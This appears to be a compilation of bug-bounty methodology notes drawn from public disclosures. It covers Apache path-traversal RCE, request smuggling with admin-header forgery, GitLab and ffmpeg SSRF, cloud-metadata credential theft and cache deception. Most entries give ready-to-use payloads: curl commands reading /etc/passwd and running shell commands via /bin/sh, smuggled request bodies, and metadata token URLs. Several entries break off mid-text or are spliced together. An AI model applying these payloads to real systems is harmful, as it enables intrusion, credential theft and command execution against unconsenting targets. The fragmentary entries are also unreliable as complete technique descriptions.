### [Bugbountyskills.md] 17.127 A server's URL-normalization ORDER (decode AFTER the check) turns a percent-encoded dot-dot into arbitrary file read, and an existing `ScriptAlias` turn it into command execution — with the encoding DEPTH as the bypass ladder (Apache httpd 2.4.49 / 2.4.50, CVE-2021-41773 / CVE-2021-42013, HackerOne #1394916)

CLASS/METHOD: 2.4.49 changed path normalization so the traversal dots are decoded AFTER the safety check. File read: `curl -s --path-as-is "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"` (`--path-as-is` mandatory, otherwise the client normalizes for you). RCE appears when `mod_cgi`/`mod_cgid` is loaded and a `ScriptAlias` exists — traverse from the alias to `/bin/sh` and let the POST BODY be the CGI script: `curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"`. The 2.4.50 fix checks the SINGLY-decoded path, so double-encode the DOT — `%32%65`→`%2e`→`.` — giving `.%%32%65` ≡ `..`: `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` (7+ segments from a deep alias). Precondition stated by Apache: the aliased dirs must not carry the default `Require all denied`; a `<Directory />` with `Require all granted` opens every alias.
DETECTION SIGNAL: `Server: Apache/2.4.49|2.4.50`; a live alias (`/icons/`, `/cgi-bin/`) answering 200/403 instead of 404; the SAME segment changing status when you append `%2e` / `.%2e` / `.%%32%65` — that difference is the normalize-after-check fingerprint.
CHAIN: URL→path mapping escapes the Alias dirs → internal file read (`/etc/passwd`, vhost configs, `.env`, secrets, sibling docroots) → with CGI mapped, `/bin/sh` with the body as script ⇒ command execution as the httpd user (Critical; exploited in the wild).
TRANSFERABLE TEST: fingerprint the version, then walk ONE encoding rung ladder against ONE live alias — raw `../` → `.%2e/` → `%2e%2e%2f` → `/.%%32%65/` — always `--path-as-is`, ending at `etc/passwd` for read and `bin/sh` for RCE. The rung that lands counts the stack's decode passes; generalise to every check-then-normalise URL pipeline (probe ENCODING DEPTH, not payload).
WHY IT IS A NEW GENERAL METHOD: §8.1/§8.2 have client-side filter-defeat ladders and a generic encoded-traversal list, but nothing on a DECODE-AFTER-CHECK ordering bug inside the web server itself, no `.%2e` / `.%%32%65` rung ladder, and no "existing ScriptAlias + body-as-CGI-script" escalation.

CHAIN: free TURN credentials (P4-looking media credential) → direct `Allocate` on the vendor relay → UDP/TCP relay to loopback / RFC1918 / the metadata IP → scan and INTERACT with internal services over ANY protocol → read/modify internal state and harvest instance credentials from `169.254.169.254` (SSRF, 312 votes; the transport is what keeps it invisible to HTTP-layer defences).
TRANSFERABLE TEST: for any calls/conferencing/WebRTC product, take the TURN credentials the client uses and run `Allocate(UDP)` → `CreatePermission(127.0.0.1:<internal port>)` → `Send Indication` with `GET / HTTP/1.0\r\n\r\n`, then `Allocate(REQUESTED-TRANSPORT=6)` + `Connect` + `ConnectionBind`; a relay that answers for a loopback/RFC1918/metadata peer is the finding.
WHY IT IS A NEW GENERAL METHOD: every SSRF entry here is HTTP-shaped (URL parameters, importers, renderers, webhooks). This is the first relay/proxy primitive: the app gives you a credentialed PROXY whose peer address is arbitrary, so the whole URL-scoped defence stack (WAF, blocklist, egress proxy, allowlist) is bypassed because there is no URL.

### [Bugbountyskills.md] 17.140 A reflected POST parameter is a HEADER ORACLE after a desync, and the vendor's TRUSTED-GATEWAY ADMIN headers replayed on the internal leg turn it into admin access (New Relic login.newrelic.com, HackerOne #498052; credited writeup by the same researcher, James Kettle / albinowax, PortSwigger Research "HTTP Desync Attacks: Request Smuggling Reborn" + DEF CON 27)

CLASS/METHOD: TE.CL desync on `login.newrelic.com` — `POST / HTTP/1.1  Host: login.newrelic.com  Content-Length: 142  Transfer-Encoding: chunked  Transfer-Encoding: x  0  POST /login HTTP/1.1  Host: login.newrelic.com  Content-Type: application/x-www-form-urlencoded  Content-Length: 100  …  login[email]=asdf`. Step 2 — PROCESSED-REQUEST REFLECTION: pick any page that reflects a POST parameter, put the reflected parameter LAST in the body, and let the front-end rewrite the smuggled request before the value lands in that parameter; the reflection then leaks the front-end-added headers (`X-Forwarded-For`, `X-Forwarded-Proto`, `X-TLS-Bits/Cipher/Version`, custom `x-nr-external-service`). Step 3 — raise the declared `Content-Length` step by step to pull more of the victim request into the reflection. Step 4 — BACKEND REASSEMBLY: the "back-end" was itself a proxy, so changing the smuggled `Host:` reached internal systems (`Host: staging-alerts.newrelic.com` → 301; add `X-Forwarded-Proto: https`). Step 5 — smuggling DROPS the internet-marker header `x-nr-external-service`, so the request is treated as INTERNAL (`/revision_check` → `Not authorized with header:`; re-adding the marker gave 403). Step 6 — replay the vendor's trusted gateway headers on the internal leg: `POST /internal_api/934454/session` (`Host: alerts.newrelic.com`, `Transfer-encoding: cow`) with `Service-Gateway-Account-Id: 934454` and `Service-Gateway-Is-Newrelic-Admin: true` → `200 OK {"user":{"account_id":934454,"is_newrelic_admin":true},…}` = full admin on the internal API. The poisoned socket is a LOGIN endpoint, so the next user's `POST /login` body (credentials) is absorbed → the report's "Password theft"; a `307` after a POST makes victims resend plaintext passwords to an attacker destination.
DETECTION SIGNAL: a both-TE / CL.TE / TE.CL framing disagreement between the front-end and origin; ANY endpoint that reflects a POST parameter into HTML (the exfil channel for headers you cannot otherwise guess); front-end-appended headers visible only on the internal leg (`X-Forwarded-*`, `X-TLS-*`, vendor service markers); error text naming a missing auth header; internal vhosts reachable by rewriting the smuggled `Host`; trusted-gateway auth headers (`Service-Gateway-*`, `*-Is-Admin`, `X-Internal-*`) accepted from the edge.
CHAIN: unauthenticated desync → reflected-POST parameter used as a header oracle → smuggled `Host`/`X-Forwarded-Proto` reach internal hosts → internet marker lost so the request is treated as internal → attacker-supplied `Service-Gateway-Is-Newrelic-Admin: true` → full admin access to the internal API; and capture of the next victim's plaintext login credentials (a desync primitive escalated to key disclosure + internal-admin access).
TRANSFERABLE TEST: after confirming socket poisoning, find any reflecting parameter, place it last and set the declared `Content-Length` just above the real length — victim headers appearing inside the reflected value = header oracle. Then replay with a different `Host:` to map internal vhosts, re-add every leaked header the app expects, and finally inject the vendor's trusted-gateway admin headers and diff the response.
WHY IT IS A NEW GENERAL METHOD: §17 records the framing bug, cache poisoning and session theft (17.77, 17.128, etc.), but not the two escalations that make a desync READ and then ADMIN — the reflected parameter as an ORACLE to enumerate front-end-added header names, and the replay of TRUSTED GATEWAY admin headers on the internal leg. Reusable rule: once you can smuggle, use any reflecting parameter to enumerate the front-end's header set, then impersonate the gateway with the names you learned; a missing internet-marker header is itself an access-control bypass.

### [Bugbountyskills.md] 17.154 A user-supplied URL is interpolated INSIDE a CLI config argument (`-c http.<url>.extraHeader=…`) so the URL becomes the CONFIG KEY — the attacker renames the option and points the tool's own fetcher at an internal service → SSRF (GitLab gitaly `import_url` → `http.<url>.proxy`)

SOURCE: https://hackerone.com/reports/855276 — GitLab, *"Injection of `http.<url>.*` git config settings leading to SSRF"* (Server-Side Request Forgery (SSRF); 34 votes; reporter **vakzz**; asset "Your Own GitLab Instance", max severity critical; created 2020-04-21, disclosed 2020-09-08; resolved)  read 2026-11-07 (full 4,459-B public body from the LOCAL disclosed-reports mirror `/tmp/h1_train.parquet` + live page via `web_extract`)
CLASS: config-KEY injection into a command-line argument — the attacker string is spliced between two constants of a `-c key=value` flag, so the string becomes the KEY and any option of the underlying tool can be selected (here git's `http.<url>.proxy`), converting an import/mirror feature into a full SSRF (SOCKS4/5 reach non-HTTP services too).
CORE METHOD (reporter's verbatim steps):
  1. gitaly `create_from_url.go#L37` builds the clone flag as `flags = append(flags, git.ValueFlag{Name: "-c", Value: fmt.Sprintf("http.%s.extraHeader=%s", u.String(), authHeader)})` → argv `git clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic ***' -- http://example.com/repo.git /repo/path`.
  2. Any `http.*` option from the git-config docs is therefore selectable by shaping the URL: `import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500` writes `[http "http://google.com/"]` / `proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic ***` into the repo's `.git/config`.
  3. Create a short-TTL DNS record + a `200 OK` listener on the target port, then `POST /api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4`.
  4. Re-point the DNS record at `127.0.0.1`, wait, then force a fetch through the poisoned config: `PUT /api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?` (the trailing `?` strips git's appended path).
  5. Read the SSRF out of the job's error text: `GET /api/v4/projects/204 | jq .import_error` → `"…fatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405"` = internal Consul answering on 8500. Reporter's note: git/curl also accepts `socks4`/`socks5`, so the same knob reaches redis-style services or leaks internal DNS.
DETECTION SIGNAL: a URL passed to a CLI as part of a config KEY/VALUE (`git -c http.<url>.extraHeader`, `curl -K`/`--proxy`, `ssh -o`, `docker --config`, `rsync --rsh`, `pip --index-url`) — the tell is the template `http.%s.extraHeader` where the URL sits between two constants; plus any import/mirror/sync/webhook fetch that runs SERVER-side as a background job whose failure text is echoed back.
CHAIN: project-creation rights (primitive: one crafted `import_url`, P5 on its own) → the URL becomes the git config key `http.<url>.proxy` → the mirror fetch is proxied through the attacker → SSRF into `127.0.0.1:<any port>` (proved via internal Consul) → in cloud, to the metadata service → IAM credentials → RCE.
TRANSFERABLE TEST: post `import_url=http://x@canary.tld/.proxy=http://<listener>:<port>` (and `/.followRedirects=true`, `/.sslVerify=false`, `/.cookieFile=<path>`), let the import finish, re-point the DNS record at an internal address, trigger a SECOND fetch (mirror/sync) and read `import_error`. A hit on your listener = the config was written; a request only the server could make = SSRF. Rule: if your string is spliced next to a constant in a config argument, assume you can rename the option.
WHY IT IS A NEW GENERAL METHOD: the ledger's injection material is command injection (`;`/backticks), SQLi, template/SSTI and path traversal — none of it records the attacker's string becoming a CONFIG *KEY* of the tool performing the fetch. This is a fourth, structurally different sink: `-c <prefix><ATTACKER><suffix>`, i.e. option RENAMING, and it generalises to every CLI that takes `key=value` config on the command line; the second half (a background, delayed fetch you re-target by DNS) is what makes the SSRF provable.

### [Bugbountyskills.md] 17.163 A media DEMUXER resolves URLs and PATHS that are embedded as PLAYLIST DIRECTIVES inside an uploaded file — the upload passes the extension/MIME allowlist, then ffmpeg's HLS handling fetches your URL (SSRF) or reads a local file and hands it back to you (LFR) (TikTok video upload, HackerOne #1062888)

CORE METHOD:
  1. Entry point: ANY upload that reaches a server-side `ffmpeg`/`ffprobe` run (video/audio upload, thumbnail/preview generation, "convert on upload", HLS/DASH ingest). Upload a file whose CONTENT is an HLS playlist while keeping the extension the allowlist expects (the reporter used `.avi`):

## [Bugbountyskills.md] V-34: SSRF that STORES its response — the serving route is the exfiltration channel

**Also known as:** feed proxy + thumbnail generator; fetch-store-serve; parser error as a network oracle.
**Mechanism:** a URL-accepting feature never echoes the body, but the fetched bytes are STORED and served from a
route that needs no authentication (`/playbookgallery/assetimage/{imgId}`) — the whole response is retrievable at
leisure, uncapped and content-type-agnostic. The low-privilege sibling (`GET /magicpagesetting/getfeeddata?q=`)
returns its PARSER's verdict, so a private IP answering "not an allowed feed format" proves the fetch succeeded:
a reachability oracle; divergent connection errors ("actively refused" vs "forcibly closed" vs 404) enumerate ports.
**Preconditions:** any `url=|imgUrl=|feedUrl=|source=` parameter (feed reader, thumbnailer, preview, renderer,
importer); a route that serves generated assets.
**Detect:** point the feature at your own listener and watch for the second request; walk the internal ladder
(`127.0.0.1`, `localhost`, `[::1]`, `2130706433`, `169.254.169.254`, RFC1918); if the response is an id, fetch
the STORED artefact WITHOUT cookies; read parser error text as the ports/reachability signal.
**Proof of concept:** internal Swagger/`openapi.json` + a health endpoint (names the datastores) retrieved, then
fetched anonymously from the asset route; port-oracle table for open/closed.
**Chain it with:** `info-disclosure-testing` (internal API surface → destructive operations enumerated),
`cloud-metadata` (IMDS credentials), `auth-bypass` (internal admin routes).
**Do not report:** a 200 to a callback you control, DNS-only evidence, or an image-service SSRF with no body
retrieved — the store-then-serve route is what makes it reportable.

### [bugbountyhuntingskills.md] 2.2 SSRF used as a *response oracle* — internal fetch output echoed in an error message

**Source:** HackerOne #2262382 — HackerOne itself, *"SSRF via Analytics Reports"*, **$25,000**,
Critical 10.0.

**Core method**
- The request itself was already possible; the escalation was that the application **returned the
  fetched content inside an error message**. That converts blind SSRF into full-read.
- So the method is: after confirming a callback, deliberately induce a *failure* at the internal
  target (bad path, wrong scheme, malformed query) and read the error text. Many frameworks leak the
  upstream response body or at least status/headers into the exception surfaced to the user.
- Highest-value target for the read: cloud metadata service.

**Lesson.** Full-read SSRF is worth an order of magnitude more than blind SSRF, and the difference is
usually an error handler, not a new injection point. Always test the *error path*, not just the
success path.

**Transferable test.** Confirm blind callback → point at `169.254.169.254/latest/meta-data/` (and the
GCP/Azure equivalents) → force errors and diff the returned text for internal hostnames, headers,
or partial bodies.

### [bugbountyhuntingskills.md] 2.4 Mitigation bypass: redirect chain + URL-decode smuggling

**Source:** HackerOne #878779 — GitLab (Grafana proxy), Critical; and #632101 — GitLab,
`CVE-2019-5464`, mitigation bypass reaching `http://127.0.0.1`.

**Core method**
- Assume a blocklist exists. Enumerate what it inspects: hostname? resolved IP? full URL string?
  Does it re-check after a redirect? Almost never.
- Build a chain through an **allowed** host that will redirect anywhere:
  `secure.gravatar.com` accepts a `d` parameter that redirects to `i0.wp.com` — both allowlisted, so

  (`?d=...&url=...` reconstructed after the allowlist check).
- Result: unauthenticated full-read SSRF to `localhost:3903` (`mtail`), then port-scan the loopback
  range and identify services by response: `9093` Alertmanager, `9100` Node Exporter, `9187`
  Postgres Exporter, `9121` Redis Exporter, `8500` Consul, `9090` Prometheus.

**Transferable test.** For any SSRF filter: (1) try an allowlisted redirector, (2) try DNS rebinding,
(3) try decimal/octal/IPv6 encodings of `127.0.0.1`, (4) try `@`-userinfo and fragment tricks,
(5) look for a decode step that runs *after* validation. Then fingerprint open loopback ports by
status code and body length.

### [bugbountyhuntingskills.md] 8.4 Path traversal in the multipart *filename*

**Source:** Medium, *"Unauthenticated Arbitrary File Upload Lead To LFI via Path Traversal"*
(2025-06).

### [bugbountyhuntingskills.md] 8.7 Fragment + base64 to defeat extension whitelists — Evernote SSRF

**Source:** Neolex Security blog (`blog.neolex.dev/13/`), HackerOne report, **$5,000** critical.

**Core method**
- A proxied asset endpoint takes a **base64-encoded path**:
  ```
  /ro/L2Y2Y2RkNGJkZmE0YzFiODZmNDQxYzdjMjlmMDcyZTUxMWRkMzQ1MDEuY3Nz
  ```
  which decodes to `/f6cd....css`, and returns that file's contents.
- A whitelist requires the decoded value to end in `.css` or `.js`.
- Encode a metadata URL and append a fragment so the string ends in `.js`:
  ```
  http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token#.js
  ```

**Lesson.** Encoding layers hide the real target from every string check. Whenever a parameter looks

`169.254.169.254` (AWS/Azure/DO), `metadata.google.internal` (GCP, needs
`Metadata-Flavor: Google`).

### [bugbountyhuntingskills.md] 8.8 Path traversal as a *cache* primitive — ChatGPT wildcard cache deception

**Source:** Harel Security Research (`nokline.github.io`), Feb 2024, **$6,500**, ATO.

**Core method**
- The share feature caches everything under `/share/*` (`Cf-Cache-Status: HIT` on a non-static path).
- Cloudflare does **not** decode/normalize `%2F..%2F`; the origin does.
- Payload:
  ```
  https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123
  ```
  CDN sees `/share/...` → caches. Origin normalizes to `/api/auth/session` → returns the victim's
  auth token. Attacker fetches the same URL and reads the cached token.
- The cachebuster keeps test requests from poisoning each other and forces a fresh key per victim.

**Lesson.** Path traversal is not only a filesystem bug — any two parsers that disagree about
`%2F`, `..`, `;`, `#`, or `%00` create a traversal. Enumerate cache rules by path prefix, then find
the normalization delta. This is the same primitive as 8.5, applied to a CDN instead of `include()`.

**Transferable test.** For any cached prefix, request `<prefix>/<random>`; if cached, try
`<prefix>/%2F..%2F<dynamic-endpoint>` and compare the body to the dynamic endpoint's body. Check
`X-Cache`, `CF-Cache-Status`, `Age`, and response-time deltas.

### [bugbountyhuntingskills.md] 11.1 Underscore/dash header smuggling — mTLS header forgery

**Source:** Robin Verton & Simon Peters, Telekom Security (2020-05).

**Core method**
- The proxy strips the trusted header:
  ```apache
  RequestHeader unset CLIENT_VERIFIED
  ```
  but Apache does **not** strip underscore variants on `ProxyPass`, and WSGI (Django/Flask) maps
  `CLIENT-VERIFIED` → `HTTP_CLIENT_VERIFIED` and also exposes `CLIENT_VERIFIED` as
  `HTTP_CLIENT_VERIFIED`.
- So send the header with the *other* separator:
  ```http
  GET / HTTP/1.1
  Host: target
  CLIENT-VERIFIED: true
  ```
  or `CLIENT_VERIFIED: true` — one of the two survives `unset` and normalizes to the name the
  backend trusts.
- Nginx strips underscores only for `proxy_pass` (unless `underscores_in_headers on`); PHP folds
  `-` to `_` in `$_SERVER`, so `X-Forwarded-For` and `X_Forwarded_For` collide.
- Escalate to full bypass by combining with a **path differential**: the proxy only cert-authenticates
  `/auth/cert/smartcard.xhtml`, but Tomcat truncates at `;`:
  ```
  curl --path-as-is 'https://target/auth/cert;foo=bar/smartcard.xhtml' \
    -H 'SSL_CLIENT_S_DN_Email: user@email.com' \
    -H 'SSL_CLIENT_S_DN_CN: User Name' \
    -H 'SSL_CLIENT_VERIFY: SUCCESS'
  ```
  Apache sees a path outside the `Location` block (no cert check), Tomcat routes it to the protected
  page with the attacker-supplied identity headers.

**Lesson.** The bug lives in the **component boundary**, not in one component. Enumerate the
normalization table for the exact stack (see below), then send the same logical header in every
separator/case form.

| Proxy | Path interpretation | Underscore header |
|---|---|---|
| Apache | full path incl. `;` | passes on `ProxyPass` |
| Nginx | full path incl. `;` | strips on `proxy_pass` |
| Tomcat / Jetty / WildFly / WebLogic | truncates at `;` | n/a |

**Transferable test.** Send `X-Forwarded-For`, `X_Forwarded_For`, `X-Forwarded-For ` (trailing
space), `X-Forwarded-For\t`, and duplicate headers; compare what the app echoes in
`/whoami`, `/account`, or an error page. Then test `;`, `%3b`, `..;/`, and `%2f` path variants
against any auth-gated prefix.

### [bugbountyhuntingskills.md] 11.5 TE.0 HTTP request smuggling — mass zero-click ATO

**Source:** Bugcrowd blog, Paolo Arnolfo / Guillermo Gregorio / @_medusa_1_ (2024-07), **$8,500**
from Google; affected thousands of GCP load balancer frontends.

**Core method**
- Existing classes: CL.TE, TE.CL, TE.TE, CL.0. The novel one is **TE.0**: the front-end honors
  `Transfer-Encoding`, the back-end treats the body length as 0.
- PoC — note the hex chunk size, the two empty lines after the terminating `0`, and the missing
  `Content-Length`:
  ```http
  OPTIONS / HTTP/1.1
  Host: target
  Accept-Encoding: gzip, deflate, br
  Accept: */*
  Accept-Language: en-US;q=0.9,en;q=0.8
  User-Agent: Mozilla/5.0 ...
  Transfer-Encoding: chunked
  Connection: keep-alive

  50
  GET HTTP/1.1
  x: X
  0


  ```
- Sent repeatedly (Burp Intruder, null payloads), the smuggled prefix poisons the next user's

- Fingerprint: `Via: 1.1 google`, or `Invalid IAP credentials: empty token` on IAP-protected hosts;

- Tuning: chunk size must be **hex**; disable Burp's automatic `Content-Length`; try `OPTIONS` when

**Lesson.** Smuggling is not only cache poisoning — it is a **zero-click ATO** primitive when the
smuggled request carries the victim's cookies. When you find any parser differential at the edge
(8.8, 11.1, 11.5), ask "whose request can I append to?"

### [bugbountyhuntingskills.md] 12.4 Cache deception + client-side path traversal → ATO

**Source:** `zere.es` — *"Cache Deception + CSPT: Turning Non-Impactful Findings into Account
Takeover"*.

**Core method**
- Cache deception alone is unexploitable here because the attacker cannot make the victim send
  their `X-Auth-Token`. The missing piece is a **client-side path traversal**:
  ```
  https://example.com/profile?id=../../token.css
  ```
  The front-end concatenates `id` into a fetch path, so the victim's browser requests
  `/v1/token.css` with the auth header.

**Lesson.** Chain a *delivery* primitive (CSPT, open redirect, HTML injection) with the *storage*
